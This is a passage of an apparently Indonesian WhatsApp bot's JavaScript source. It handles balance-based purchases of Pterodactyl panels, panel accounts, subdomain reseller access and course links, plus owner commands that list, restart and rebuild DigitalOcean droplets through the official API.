* Jangan Bagi² Panel Free
* Bikin Panel Harus Di Pakai
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Jangan Sebar Link Login

> Rules Lengkap Ada Di Grub`);
   addTransaction(m.sender, 'Buy Reseller Panel Private', harga);
   await Rulzz.sendMessage(owner, {
      text: `📢 RESELLER PANEL PRIVATE SOLDOUT ❗
─────────────────────────────────────
*🆔 Nama Barang :* Reseller Panel Private
*💵 Harga :* Rp${await toIDR(harga)}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo
📦 Status : ✅ Berhasil`,
      mentions: [m.sender],
    });
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

case "buymurbug": case "belimurbug": case "buymuridbug": {
if (m.isGroup) return m.reply("Pembelian murbug hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

 const harga = global.hargamurbug;
 const owner = global.owner + "@s.whatsapp.net";
 const saldoUser = db.users[m.sender].saldo || 0;
 const saldoSebelum = saldoUser;
 const saldoSesudah = saldoUser - harga;
 
 if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Murid Bug Berhasil!*

*🆔 Nama Barang :* Murid Bug
*💵 Harga :* Rp${await toIDR(harga)}
*🌐 Link :* ${global.linkmurbug}
*📆 Masa Aktif :* Permanen
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo

> Tunggu sampai di acc, jika dalam waktu 3 jam lebih belum di acc Silakan telpon admin

*Rules Reseller Panel ⚠️*
* Jangan Bagi² Panel Free
* Bikin Panel Harus Di Pakai
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Jangan Sebar Link Login

> Rules Lengkap Ada Di Grub`);
   addTransaction(m.sender, 'Buy Murid Bug', harga);
   await Rulzz.sendMessage(owner, {
      text: `📢 MURID BUG SOLDOUT ❗
─────────────────────────────────────
*🆔 Nama Barang :* Murid Bug Permanen
*💵 Harga :* Rp${await toIDR(harga)}
*🌐 Link :* ${global.linkmurbug}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
*🏧 Metode Pembayaran :* Saldo
📦 Status : ✅ Berhasil`,
      mentions: [m.sender],
    });
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

case "buyresellersubdo": case "buyressubdo": {
if (m.isGroup) return m.reply("Pembelian reseller subdomain hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  const harga = global.hargaressubdo
  const owner = global.owner + "@s.whatsapp.net";
  const saldoUser = db.users[m.sender].saldo || 0;
  const saldoSebelum = saldoUser;
  const saldoSesudah = saldoUser - harga;

if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Reseller Subdomain Berhasil!*

🆔 Nama Barang : Reseller Subdomain
💵 Harga : Rp${await toIDR(harga)}
🌐 Link : ${global.linkressubdo}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Metode Pembayaran : Saldo`);
    addTransaction(m.sender, 'Buy Reseller Subdomain', harga);
    await Rulzz.sendMessage(owner, {
      text: `📢 RESELLER SUBDOMAIN SOLDOUT ❗
──────────────────────────────────────
🆔 Pembeli : @${m.sender.split("@")[0]}
💸 Harga : Rp${await toIDR(harga)}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
🏧 Pembayaran : Saldo
📦 Status : ✅ Berhasil`,
      mentions: [m.sender],
    });
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

case "buymurnok": case "buymuridnokos": {
if (m.isGroup) return m.reply("Pembelian murid nokos hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  const harga = global.hargamurlog
  const owner = global.owner + "@s.whatsapp.net";
  const saldoUser = db.users[m.sender].saldo || 0;
  const saldoSebelum = saldoUser;
  const saldoSesudah = saldoUser - harga;
  
  if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Murid Nokos Berhasil!*

🆔 Nama Barang : Murid Nokos
💵 Harga : Rp${await toIDR(harga)}
🌐 Link : ${global.linkmurlog}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Metode Pembayaran : Saldo`);
    addTransaction(m.sender, 'Buy Murid Nokos', harga);
    await Rulzz.sendMessage(owner, {
      text: `📢 MURID NOKOS SOLDOUT ❗
──────────────────────────────────────
🆔 Pembeli : @${m.sender.split("@")[0]}
💸 Harga : Rp${await toIDR(harga)}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}
🏧 Pembayaran : Saldo
📦 Status : ✅ Berhasil`,
      mentions: [m.sender],
    });
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

case "buyegg": case "buyeggpanel": {
if (m.isGroup) return m.reply("Pembelian egg panel hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const harga = 3500
const saldoUser  = db.users[m.sender].saldo || 0;
const saldoSebelum = saldoUser;
const saldoSesudah = saldoUser - harga;
const owner = global.owner + '@s.whatsapp.net';

  if (saldoUser  >= harga) {
    db.users[m.sender].saldo -= harga;
    m.reply(`*Pembelian Egg Panel Berhasil✅*

*💵 Harga :* Rp${await toIDR(harga)}
*💳 Saldo Sebelumnya :* Rp${await toIDR(saldoSebelum)}
*💳 Saldo Sekarang :* Rp${await toIDR(saldoSesudah)}

* *Jumlah :* 8 Egg Panel
*Link Egg :* https://www.mediafire.com/file/pjcvl6rx9yw4y9f/8_Egg_Pterodactyl_Rulzz_OfficiaL.zip/file

*⚠️FYI :*
- Ekstrak dulu file nya baru upload di nest panel kalian

> Ada kendala bisa chat nomor admin di www.rulzzofficial.my.id`);
    addTransaction(m.sender, 'Buy Egg Panel', harga);
    await Rulzz.sendMessage(owner, {
    text: `📢 EGG PANEL SOLDOUT ❗
──────────────────────────────────────
🆔 Pembeli : @${m.sender.split("@")[0]}
💸 Harga : Rp${await toIDR(harga)}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Pembayaran Via : Saldo
📦 Status : Berhasil ✅`, mentions: [m.sender]
  });  
  } else {
  m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break
//================================================================================

case "buypanel": {
  if (m.isGroup) return m.reply("Pembelian panel hanya bisa di private chat!");

  if (db.users[m.sender].status_deposit)
    return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan!");
if (!text) return m.reply(example("username"));
if (text.includes(" ")) return m.reply("Username tidak boleh pakai spasi!");

let usn = text.toLowerCase();
let sett = global.panel;
return Rulzz.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "Pilih Ram" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Ram Server",
            sections: [
              {
                highlight_label: "High Quality",
                rows: [
                  {
                      title: "Unlimited ✅",
                      description: await toIDR(sett["unli"]),
                      id: `.buyypanel ${usn} unlimited`
                  },
                  {
                       title: "1GB ✅",
                       description: await toIDR(sett["1gb"]),
                       id: `.buyypanel ${usn} 1gb`
                  },
                  {
                       title: "2GB ✅",
                       description: await toIDR(sett["2gb"]),
                       id: `.buyypanel ${usn} 2gb`
                  },
                  {
                       title: "3GB ✅",
                       description: await toIDR(sett["3gb"]),
                       id: `.buyypanel ${usn} 3gb`
                  },
                  {
                      title: "4GB ✅",
                      description: await toIDR(sett["4gb"]),
                      id: `.buyypanel ${usn} 4gb`
                  },
                  {
                       title: "5GB ✅",
                       description: await toIDR(sett["5gb"]),
                       id: `.buyypanel ${usn} 5gb`
                  },
                  {
                       title: "6GB ✅",
                       description: await toIDR(sett["6gb"]),
                       id: `.buyypanel ${usn} 6gb`
                   },
                   {
                       title: "7GB ✅",
                       description: await toIDR(sett["7gb"]),
                       id: `.buyypanel ${usn} 7gb`
                   },
                   {
                       title: "8GB ✅",
                       description: await toIDR(sett["8gb"]),
                       id: `.buyypanel ${usn} 8gb`
                    },
                    {
                       title: "9GB ✅",
                       description: await toIDR(sett["9gb"]),
                       id: `.buyypanel ${usn} 9gb`
                    },
                    {
                       title: "10GB ✅",
                       description: await toIDR(sett["10gb"]),
                       id: `.buyypanel ${usn} 10gb`
                    },
                ]
              }
            ]
          })
        }
      }
    ],
    text: `*Pilih Ram panel yang ingin di beli untuk username :* ${usn}`,
    viewOnce: true,
    headerType: 1
  },
  { quoted: qtoko }
);
}
break

case "buyypanel": {
  if (m.isGroup) return m.reply("❌ Pembelian panel hanya bisa di private chat!");

  let daftarRam = `*乂 LIST RAM SERVER YANG TERSEDIA*

1GB
2GB 
3GB
4GB
5GB
6GB
7GB
8GB
9GB
10GB
Unlimited

Ketik dengan format: *.buyypanel <username> <ram>*
Contoh: *.buyypanel rulzstore 2gb*`;

  if (!text) return m.reply(daftarRam);

  const [inputUsername, ramSize] = text.trim().split(" ");
  if (!inputUsername) return m.reply("⚠️ Silakan masukkan username untuk panel!");
  if (!ramSize) return m.reply(daftarRam);

  let cmd = ramSize.toLowerCase();
  let Obj;
  let sett = global.panel;

  if (cmd == "1gb") Obj = {
  ram: "1000",
  disk: "1000",
  cpu: "40",
  harga: sett["1gb"]
 };
 else if (cmd == "2gb") Obj = {
   ram: "2000",
   disk: "1000",
   cpu: "60",
   harga: sett["2gb"]
 };
 else if (cmd == "3gb") Obj = {
   ram: "3000",
   disk: "2000",
   cpu: "80",
   harga: sett["3gb"]
 };
 else if (cmd == "4gb") Obj = {
   ram: "4000",
   disk: "2000",
   cpu: "100",
   harga: sett["4gb"]
 };
 else if (cmd == "5gb") Obj = {
   ram: "5000",
   disk: "2000",
   cpu: "150",
   harga: sett["5gb"]
 };
 else if (cmd == "6gb") Obj = {
   ram: "6000",
   disk: "2000",
   cpu: "200",
   harga: sett["6gb"]
 };
 else if (cmd == "7gb") Obj = {
   ram: "7000",
   disk: "2000",
   cpu: "250",
   harga: sett["7gb"]
 };
 else if (cmd == "8gb") Obj = {
   ram: "8000",
   disk: "2000",
   cpu: "300",
   harga: sett["8gb"]
 };
 else if (cmd == "9gb") Obj = {
   ram: "9000",
   disk: "2000",
   cpu: "350",
   harga: sett["9gb"]
};
 else if (cmd == "10gb") Obj = {
   ram: "10000",
   disk: "2000",
   cpu: "400",
   harga: sett["10gb"]
 };
 else if (cmd == "unli" || cmd == "unlimited") Obj = {
   ram: "0",
   disk: "0",
   cpu: "0",
   harga: sett["unli"]
 };
 else return m.reply(`❌ RAM tidak tersedia!\n\n${daftarRam}`);;

  const saldoUser = db.users[m.sender].saldo || 0;
  const harga = Obj.harga;
  const saldoSebelum = saldoUser;
  const saldoSesudah = saldoUser - harga;
  const ramTeks = Obj.ram == "0" ? "Unlimited" : Obj.ram + "MB";
  const diskTeks = Obj.disk == "0" ? "Unlimited" : Obj.disk + "MB";
  const cpuTeks = Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%";
  const owner = global.owner + '@s.whatsapp.net';

  Obj.customUsername = inputUsername;

  if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Panel Berhasil!*
    
🆔 Username : ${Obj.customUsername}
🧠 RAM : ${ramTeks}
📦 Disk : ${diskTeks}
💻 CPU : ${cpuTeks}
💵 Harga : Rp${await toIDR(harga)}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Metode Pembayaran : *Saldo*

*_⌛ Sedang memproses panel anda..._*`);

    let hasil = false;
    try {
      hasil = await buatPanel(m, Obj);
    } catch (e) {
      hasil = false;
    }

    const statusTeks = hasil ? "✅ Berhasil" : "❌ Gagal";
    
    addTransaction(m.sender, `Buy Panel ${ramTeks}`, harga);
    await Rulzz.sendMessage(owner, {
      text: `📢 *PANEL PRIVATE SOLDOUT*
────────────────────
👤 Pembeli : @${m.sender.split("@")[0]}
🆔 Username : ${Obj.customUsername}
🧠 RAM : ${ramTeks}
📦 Disk : ${diskTeks}
💻 CPU : ${cpuTeks}
💰 Harga : Rp${await toIDR(harga)}
🏧 Pembayaran : Saldo
📦 Status : ${statusTeks}`,
      mentions: [m.sender],
    });

    if (!hasil) {
      db.users[m.sender].saldo += harga;
      m.reply(`⚠️ Panel gagal diproses.\nSaldo kamu telah dikembalikan otomatis sebesar Rp${await toIDR(harga)}.`);
    }
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

//================================================================================

case "buyadp": case "buyadminpanel": {
  if (m.isGroup)
    return m.reply("❌ Pembelian admin panel pterodactyl hanya bisa di dalam private chat!");
  if (db.users[m.sender].status_deposit)
    return m.reply("⚠️ Masih ada transaksi yang belum diselesaikan.\nKetik *.batalbeli* untuk membatalkan!");

  if (!text) return m.reply(example("username"));
  if (text.includes(" ")) return m.reply("❌ Username tidak boleh memakai spasi!");

  let us = crypto.randomBytes(2).toString("hex");
  let Obj = {};
  Obj.username = text.toLowerCase() + us;

  const harga = global.hargaadp;
  const owner = global.owner + "@s.whatsapp.net";
  const saldoUser = db.users[m.sender].saldo || 0;
  const saldoSebelum = saldoUser;
  const saldoSesudah = saldoUser - harga;

  if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;

    await m.reply(`✅ *Pembelian Admin Panel Berhasil!*

🆔 Username : ${Obj.username}
💵 Harga : Rp${await toIDR(harga)}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Metode Pembayaran : *Saldo*

*_⌛ Sedang memproses akun admin panel kamu..._*`);

    let hasil = false;
    try {
      hasil = await buatAdp(m, Obj);
    } catch (e) {
      hasil = false;
    }

    const statusTeks = hasil ? "✅ Berhasil" : "❌ Gagal";
    
    addTransaction(m.sender, 'Buy Admin Panel', harga);
    await Rulzz.sendMessage(owner, {
      text: `📢 ADMIN PANEL SOLDOUT ❗
──────────────────────────────────────
🆔 Pembeli : @${m.sender.split("@")[0]}
👨‍💻 Username : ${Obj.username}
💸 Harga : Rp${await toIDR(harga)}
🏧 Pembayaran : Saldo
📦 Status : ${statusTeks}`,
      mentions: [m.sender],
    });

    if (!hasil) {
      db.users[m.sender].saldo += harga;
      m.reply(`⚠️ Pembuatan akun admin panel gagal.\nSaldo kamu telah dikembalikan otomatis sebesar Rp${await toIDR(harga)}.`);
    }
  } else {
    m.reply(`❌ Saldo kamu tidak cukup!\n💰 Harga: Rp${await toIDR(harga)}\n💳 Saldo saat ini: Rp${await toIDR(saldoUser)}`);
  }
}
break

//================================================================================

case "buyptp": case "buypartnerpanel": {
  if (m.isGroup) return m.reply("Pembelian partner panel pterodactyl hanya bisa di dalam private chat");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
  if (!text) return m.reply(example("username"));
  if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!");

  let us = crypto.randomBytes(2).toString('hex');
  let Obj = {};
  Obj.username = text.toLowerCase() + us;

  const harga = global.hargaptp;
  const owner = global.owner + "@s.whatsapp.net";
  const saldoUser = db.users[m.sender].saldo || 0;
  const saldoSebelum = saldoUser;
  const saldoSesudah = saldoUser - harga;

  if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;
    let saldoBaru = db.users[m.sender].saldo;

    await m.reply(`✅ *Pembelian Partner Panel Berhasil!*

🆔 Username : ${Obj.username}
💵 Harga : Rp${await toIDR(harga)}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Metode Pembayaran : Saldo

*_⌛ Sedang memproses akun partner panel kamu..._*`);
    
    let hasil = false;
    try {
      hasil = await buatAdp(m, Obj);
    } catch (e) {
      hasil = false;
    }

    const statusTeks = hasil ? "✅ Berhasil" : "❌ Gagal"
    
    addTransaction(m.sender, 'Buy Partner Panel', harga);
    await Rulzz.sendMessage(owner, {
      text: `📢 PARTNER PANEL SOLDOUT ❗
──────────────────────────────────────
🆔 Pembeli : @${m.sender.split("@")[0]}
💸 Harga : Rp${await toIDR(harga)}
🏧 Pembayaran Via : Saldo
📦 Status : ${statusTeks}`,
      mentions: [m.sender]
    });
    
     if (!hasil) {
      db.users[m.sender].saldo += harga;
      m.reply(`⚠️ Pembuatan partner panel gagal.\nSaldo kamu telah dikembalikan otomatis sebesar Rp${await toIDR(harga)}.`);
    }
  } else {
    m.reply(`Saldo kamu kurang!\n💸 Harga: Rp${await toIDR(harga)}\n💰 Saldo kamu: Rp${await toIDR(saldoUser)}`);
  }
}
break

//================================================================================

case "buyownp": case "buyownerpanel": {
  if (m.isGroup) return m.reply("Pembelian owner panel pterodactyl hanya bisa di dalam private chat");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
  if (!text) return m.reply(example("username"));
  if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!");

  let us = crypto.randomBytes(2).toString('hex');
  let Obj = {};
  Obj.username = text.toLowerCase() + us;

  const harga = global.hargaownp;
  const owner = global.owner + "@s.whatsapp.net";
  const saldoUser = db.users[m.sender].saldo || 0;
  const saldoSebelum = saldoUser;
  const saldoSesudah = saldoUser - harga;

  if (saldoUser >= harga) {
    db.users[m.sender].saldo -= harga;
    let saldoBaru = db.users[m.sender].saldo;

    await m.reply(`✅ *Pembelian Owner Panel Berhasil!*

🆔 Username : ${Obj.username}
💵 Harga : Rp${await toIDR(harga)}
💳 Saldo Sebelumnya : Rp${await toIDR(saldoSebelum)}
💳 Saldo Sekarang : Rp${await toIDR(saldoSesudah)}
🏧 Metode Pembayaran : Saldo

*_⌛ Sedang memproses akun owner panel kamu..._*`);
    let hasil = false;
    try {
      hasil = await buatAdp(m, Obj);
    } catch (e) {
      hasil = false;
    }

    const statusTeks = hasil ? "✅ Berhasil" : "❌ Gagal";
    
    addTransaction(m.sender, 'Buy Owner Panel', harga);  
    await Rulzz.sendMessage(owner, {
      text: `📢 OWNER PANEL SOLDOUT ❗
──────────────────────────────────────
🆔 Pembeli : @${m.sender.split("@")[0]}
💸 Harga : Rp${await toIDR(harga)}
🏧 Pembayaran Via : Saldo
📦 Status : ${statusTeks}`,
      mentions: [m.sender]
    });
    
    if (!hasil) {
      db.users[m.sender].saldo += harga;
      m.reply(`⚠️ Pembuatan akun owner panel gagal.\nSaldo kamu telah dikembalikan otomatis sebesar Rp${await toIDR(harga)}.`);
    }
  } else {
    m.reply(`Saldo kamu kurang!\n💸 Harga: Rp${await toIDR(harga)}\n💰 Saldo kamu: Rp${await toIDR(saldoUser)}`);
  }
}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Rulzz.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Rulzz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case "listdroplet": {
    if (!isCreator) return Reply(mess.owner);
    
    try {
        const getDroplets = async () => {
            try {
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                        Authorization: "Bearer " + global.apiDigitalOcean
                    }
                });
                const data = await response.json();
                return data.droplets || [];
            } catch (err) {
                throw new Error('Error fetching droplets: ' + err.message);
            }
        };

        getDroplets().then(droplets => {
            let totalVps = droplets.length;
            let message = `*List Droplet DigitalOcean Kamu: ${totalVps}*\n\n`;

            if (totalVps === 0) {
                message += '_Tidak ada droplet yang tersedia!_';
            } else {
                droplets.forEach(droplet => {
                    const ipv4 = droplet.networks.v4.find(net => net.type === "public");
                    const ip = ipv4 ? ipv4.ip_address : 'Tidak ada IP!';
                    const createdDate = new Date(droplet.created_at).toLocaleString('id-ID', {
                        dateStyle: 'medium',
                        timeStyle: 'short',
                        timeZone: 'Asia/Jakarta'
                    });

                    message += `*Droplet ID:* ${droplet.id}
*Hostname:* ${droplet.name}
*Username:* root
*IP:* ${ip}
*RAM:* ${droplet.memory} MB
*CPU:* ${droplet.vcpus} Core
*OS:* ${droplet.image.distribution}
*Disk:* ${droplet.disk} GB
*Status:* ${droplet.status}
*Created:* ${createdDate} WIB

`;
                });
            }

            Rulzz.sendMessage(m.chat, { text: message }, { quoted: m });
        }).catch(err => {
            m.reply('Gagal mengambil daftar droplet: ' + err.message);
        });

    } catch (err) {
        m.reply('Terjadi kesalahan: ' + err.message);
    }
}
break
//================================================================================

case "listdroplet-v2": {
    if (!isCreator) return Reply(mess.owner);
    
    try {
        const getDroplets = async () => {
            try {
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                        Authorization: "Bearer " + global.apiDigitalOcean2
                    }
                });
                const data = await response.json();
                return data.droplets || [];
            } catch (err) {
                throw new Error('Error fetching droplets: ' + err.message);
            }
        };

        getDroplets().then(droplets => {
            let totalVps = droplets.length;
            let message = `*List Droplet DigitalOcean Kamu: ${totalVps}*\n\n`;

            if (totalVps === 0) {
                message += '_Tidak ada droplet yang tersedia!_';
            } else {
                droplets.forEach(droplet => {
                    const ipv4 = droplet.networks.v4.find(net => net.type === "public");
                    const ip = ipv4 ? ipv4.ip_address : 'Tidak ada IP!';
                    const createdDate = new Date(droplet.created_at).toLocaleString('id-ID', {
                        dateStyle: 'medium',
                        timeStyle: 'short',
                        timeZone: 'Asia/Jakarta'
                    });

                    message += `*Droplet ID:* ${droplet.id}
*Hostname:* ${droplet.name}
*Username:* root
*IP:* ${ip}
*RAM:* ${droplet.memory} MB
*CPU:* ${droplet.vcpus} Core
*OS:* ${droplet.image.distribution}
*Disk:* ${droplet.disk} GB
*Status:* ${droplet.status}
*Created:* ${createdDate} WIB

`;
                });
            }

            Rulzz.sendMessage(m.chat, { text: message }, { quoted: m });
        }).catch(err => {
            m.reply('Gagal mengambil daftar droplet: ' + err.message);
        });

    } catch (err) {
        m.reply('Terjadi kesalahan: ' + err.message);
    }
}
break
//================================================================================

case "restartvps": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case "restartvps-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean2}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case "rebuild": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Rulzz.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================

case "rebuild-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean2}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Rulzz.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
